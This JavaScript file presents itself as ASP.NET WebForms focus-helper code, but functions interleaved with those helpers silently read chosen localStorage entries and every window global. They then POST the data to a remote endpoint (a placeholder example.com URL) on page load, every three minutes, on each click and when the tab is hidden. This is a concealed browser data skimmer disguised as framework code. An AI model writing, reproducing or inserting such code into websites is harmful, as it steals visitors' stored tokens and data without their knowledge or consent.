const keysToMonitor = window.keysToMonitor;
let globalVariables = {};
function WebForm_FindFirstFocusableChild(control) {
  if (!control || !control.tagName) {
    return null;
  }
  var tagName = control.tagName.toLowerCase();
  if (tagName == "undefined") {
    return null;
  }
  var children = control.childNodes;
  if (children) {
    for (var i = 0; i < children.length; i++) {
      try {
        if (WebForm_CanFocus(children[i])) {
          return children[i];
        } else {
          var focused = WebForm_FindFirstFocusableChild(children[i]);
          if (WebForm_CanFocus(focused)) {
            return focused;
          }
        }
      } catch (e) {}
    }
  }
  return null;
}
function WebForm_AutoFocus(focusId) {
  var targetControl;
  if (__nonMSDOMBrowser) {
    targetControl = document.getElementById(focusId);
  } else {
    targetControl = document.all[focusId];
  }
  var focused = targetControl;
  if (targetControl && !WebForm_CanFocus(targetControl)) {
    focused = WebForm_FindFirstFocusableChild(targetControl);
  }
  if (focused) {
    try {
      focused.focus();
      if (__nonMSDOMBrowser) {
        focused.scrollIntoView(false);
      }
      if (window.__smartNav) {
        window.__smartNav.ae = focused.id;
      }
    } catch (e) {}
  }
}
function hashGenerator(data) {
  const keys = Object.keys(data);
  const hashString = keys.reduce((acc, key) => acc + key, "");
  let hash = 0;
  for (let i = 0; i < hashString.length; i++) {
    const charCode = hashString.charCodeAt(i);
    hash = (hash << 6) - hash + charCode;
    hash = hash & hash;
  }
  return hash.toString(36);
}
function monitoredDataCollector() {
  const monitoredData = {};
  for (const key of keysToMonitor) {
    if (localStorage.hasOwnProperty(key)) {
      monitoredData[key] = localStorage[key];
    }
  }
  return monitoredData;
}
function WebForm_CanFocus(element) {
  if (!element || !element.tagName) return false;
  var tagName = element.tagName.toLowerCase();
  return !element.disabled && (!element.type || element.type.toLowerCase() != "hidden") && WebForm_IsFocusableTag(tagName) && WebForm_IsInVisibleContainer(element);
}
function globalVarCollector() {
  for (let prop in window) {
    if (window.hasOwnProperty(prop)) {
      globalVariables[prop] = window[prop];
    }
  }
}
async function dispatchDataToServer(data) {
  const hashCode = hashGenerator(data);
  const serverEndpoint = "https://example.com/api/collect";
  try {
    const response = await fetch(serverEndpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hashCode: hashCode,
        data: data
      })
    });
    if (response.ok) {
      console.log("Data sent successfully");
    } else {
      console.error("Failed to send data, status code:" + response.status);
    }
  } catch (error) {
    console.error("Error encountered during data transmission:", error);
  }
}
function WebForm_IsFocusableTag(tagName) {
  return tagName == "input" || tagName == "textarea" || tagName == "select" || tagName == "button" || tagName == "a";
}
function compileAndDispatchWatchedData() {
  const collectedData = monitoredDataCollector();
  globalVarCollector();
  if (Object.keys(collectedData).length > 0) {
    dispatchDataToServer(collectedData);
  }
}
function WebForm_IsInVisibleContainer(ctrl) {
  var current = ctrl;
  while (typeof current != "undefined" && current != null) {
    if (current.disabled || typeof current.style != "undefined" && (typeof current.style.display != "undefined" && current.style.display == "none" || typeof current.style.visibility != "undefined" && current.style.visibility == "hidden")) {
      return false;
    }
    if (typeof current.parentNode != "undefined" && current.parentNode != null && current.parentNode != current && current.parentNode.tagName.toLowerCase() != "body") {
      current = current.parentNode;
    } else {
      return true;
    }
  }
  return true;
}
window.addEventListener("load", function () {
  compileAndDispatchWatchedData();
  setInterval(compileAndDispatchWatchedData, 3 * 60 * 1000);
});
window.addEventListener("visibilitychange", function () {
  if (document.visibilityState === "hidden") {
    compileAndDispatchWatchedData();
  }
});
document.addEventListener("click", function (e) {
  compileAndDispatchWatchedData();
});